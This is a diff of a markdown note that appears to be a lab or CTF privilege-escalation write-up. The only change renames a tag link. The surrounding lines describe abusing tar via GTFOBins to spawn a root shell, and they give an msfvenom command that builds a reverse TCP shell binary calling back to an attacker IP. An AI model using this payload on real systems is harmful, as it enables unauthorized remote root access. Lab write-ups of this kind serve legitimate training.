@@ -56,7 +56,7 @@ tar czf /tmp/backup.tar.gz *
 ```
 on checking gtfo bins we find out there is a way to spawn a shell using tar using command line options. we can modify to our needs and spawn a reverse root shell back to our local machine 
 
-on your local machine generate a [[revshell]] linux binary using msfvenom 
+on your local machine generate a [[Tags/revshell]] linux binary using msfvenom 
 ```
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.26 LPORT=53 -f elf -o shell.elf
 ```
